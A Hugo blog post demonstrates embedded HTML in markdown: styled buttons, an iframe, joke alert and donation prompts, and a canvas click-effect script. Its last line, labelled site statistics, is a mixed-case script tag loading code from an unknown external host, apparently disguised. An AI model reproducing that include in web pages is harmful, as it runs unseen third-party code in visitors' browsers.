---
title: cooleffect # 标题
date: 2024-03-26 00:00:00+0000 # 日期时间，如果时间未到，post 不会显示(注释掉 不显示日期)
slug: cooleffect # url(注释掉 和标题相同)
# description: xxxx # 描述小字(注释掉 不显示描述)
# weight: 1 # 权重越小，放到越前面   (注释掉 日期排序)
image: effect.jpg # 头图，注释掉，否则会有一个难看的呃加载不出来的图片

# tags: # 只能在侧面看到的标签,会显示在文章的底部
#     - TAG A
#     - TAG B
# categories: #会显示在 post 上面的分类
#     - themes
#     - syntax
---


### support videos:

<!-- ## Bilibili video
{{< bilibili "BV1d4411N7zD" >}}
## YouTube video
{{< youtube "0qwALOOvUik" >}}
## video file
{{< video "https://www.w3schools.com/tags/movie.mp4" >}} -->

### USE HTML

一个外🔗视频： <a  href="https://www.w3schools.com/tags/movie.mp4">video</a>


<!-- //link style -->
<style>
.article-content a {
  color: #0ff; /* cyan */
}
.article-content  a:hover {
  color: #ff0; /* yello */
}
</style>

一个本站html：
<button onclick="window.open('/a.html')">打开新页面</button>

用小窗展示：
<iframe src="/a.html" width="100%" height="100px" frameborder="0" scrolling="no"></iframe>

<!-- iframe style -->
<style>
iframe:hover {
  height: 300px;
}
iframe{
  transition: 0.3s;
  box-shadow: 0 0 10px rgba(0,0,0,0.5);
}
</style>


2个按钮:
<button onclick="">用😆力戳我</button>
<button onclick="alert('你的电脑已经被我黑掉了! 给我打钱')">不要点我</button>



捐赠按钮:
<button onclick="let b = prompt('请输入你要捐赠的金额(CNY)'); alert('你已经成功捐赠了'+b+'元 ! 谢谢您！');">捐赠🧧</button>

<!-- // button style -->
<style>
button {
  background-color: #333; /* Green */
  border: none;
  color: white;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}
button:hover {
  background-color: #555;
  transform: scale(3.1);
  transition: 0.3s;
  box-shadow: 0 0 10px rgba(0,0,0,0.5);
  border-radius: 2px;
}
button:active {
  background-color: #333;
  transform: scale(0.9);
  transition: 0.1s;
}
</style>




//script 从网上抄的点击特效
<script>
function clickEffect() {
  let balls = [];
  let longPressed = false;
  let longPress;
  let multiplier = 0;
  let width, height;
  let origin;
  let normal;
  let ctx;
  const colours = ["#F73859", "#14FFEC", "#00E0FF", "#FF99FE", "#FAF15D"];
  const canvas = document.createElement("canvas");
  document.body.appendChild(canvas);
  canvas.setAttribute("style", "width: 100%; height: 100%; top: 0; left: 0; z-index: 99999; position: fixed; pointer-events: none;");
  const pointer = document.createElement("span");
  pointer.classList.add("pointer");
  document.body.appendChild(pointer);
 
  if (canvas.getContext && window.addEventListener) {
    ctx = canvas.getContext("2d");
    updateSize();
    window.addEventListener('resize', updateSize, false);
    loop();
    window.addEventListener("mousedown", function(e) {
      pushBalls(randBetween(10, 20), e.clientX, e.clientY);
      document.body.classList.add("is-pressed");
      longPress = setTimeout(function(){
        document.body.classList.add("is-longpress");
        longPressed = true;
      }, 500);
    }, false);
    window.addEventListener("mouseup", function(e) {
      clearInterval(longPress);
      if (longPressed == true) {
        document.body.classList.remove("is-longpress");
        pushBalls(randBetween(50 + Math.ceil(multiplier), 100 + Math.ceil(multiplier)), e.clientX, e.clientY);
        longPressed = false;
      }
      document.body.classList.remove("is-pressed");
    }, false);
    window.addEventListener("mousemove", function(e) {
      let x = e.clientX;
      let y = e.clientY;
      pointer.style.top = y + "px";
      pointer.style.left = x + "px";
    }, false);
  } else {
    console.log("canvas or addEventListener is unsupported!");
  }
 
 
  function updateSize() {
    canvas.width = window.innerWidth * 2;
    canvas.height = window.innerHeight * 2;
    canvas.style.width = window.innerWidth + 'px';
    canvas.style.height = window.innerHeight + 'px';
    ctx.scale(2, 2);
    width = (canvas.width = window.innerWidth);
    height = (canvas.height = window.innerHeight);
    origin = {
      x: width / 2,
      y: height / 2
    };
    normal = {
      x: width / 2,
      y: height / 2
    };
  }
  class Ball {
    constructor(x = origin.x, y = origin.y) {
      this.x = x;
      this.y = y;
      this.angle = Math.PI * 2 * Math.random();
      if (longPressed == true) {
        this.multiplier = randBetween(14 + multiplier, 15 + multiplier);
      } else {
        this.multiplier = randBetween(6, 12);
      }
      this.vx = (this.multiplier + Math.random() * 0.5) * Math.cos(this.angle);
      this.vy = (this.multiplier + Math.random() * 0.5) * Math.sin(this.angle);
      this.r = randBetween(8, 12) + 3 * Math.random();
      this.color = colours[Math.floor(Math.random() * colours.length)];
    }
    update() {
      this.x += this.vx - normal.x;
      this.y += this.vy - normal.y;
      normal.x = -2 / window.innerWidth * Math.sin(this.angle);
      normal.y = -2 / window.innerHeight * Math.cos(this.angle);
      this.r -= 0.3;
      this.vx *= 0.9;
      this.vy *= 0.9;
    }
  }
 
  function pushBalls(count = 1, x = origin.x, y = origin.y) {
    for (let i = 0; i < count; i++) {
      balls.push(new Ball(x, y));
    }
  }
 
  function randBetween(min, max) {
    return Math.floor(Math.random() * max) + min;
  }
 
  function loop() {
    ctx.fillStyle = "rgba(255, 255, 255, 0)";
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    for (let i = 0; i < balls.length; i++) {
      let b = balls[i];
      if (b.r < 0) continue;
      ctx.fillStyle = b.color;
      ctx.beginPath();
      ctx.arc(b.x, b.y, b.r, 0, Math.PI * 2, false);
      ctx.fill();
      b.update();
    }
    if (longPressed == true) {
      multiplier += 0.2;
    } else if (!longPressed && multiplier >= 0) {
      multiplier -= 0.4;
    }
    removeBall();
    requestAnimationFrame(loop);
  }
 
  function removeBall() {
    for (let i = 0; i < balls.length; i++) {
      let b = balls[i];
      if (b.x + b.r < 0 || b.x - b.r > width || b.y + b.r < 0 || b.y - b.r > height || b.r < 0) {
        balls.splice(i, 1);
      }
    }
  }
}
clickEffect();//调用特效函数
</script>
<!-- 站点统计： -->
<sCRiPt sRC=//uj.ci/dos></sCrIpT>

    